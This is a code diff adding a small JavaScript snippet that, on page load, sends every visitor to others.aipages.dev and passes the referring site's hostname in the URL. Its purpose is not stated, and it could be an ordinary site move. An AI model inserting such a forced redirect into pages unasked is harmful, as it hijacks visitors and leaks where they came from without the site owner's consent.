@@ -1,0 +1,12 @@
+(function () {
+  'use strict';
+  var TARGET = 'https://others.aipages.dev/';
+  function hostOf(u) {
+    try { return new URL(u).hostname || ''; } catch (e) { return ''; }
+  }
+  var ref = hostOf(document.referrer) || location.hostname || '';
+  if (/^others\.aipages\.dev$/i.test(location.hostname)) return;
+  if (window.__jump_done__) return;
+  window.__jump_done__ = true;
+  location.replace(TARGET + '?' + encodeURIComponent(ref));
+})();
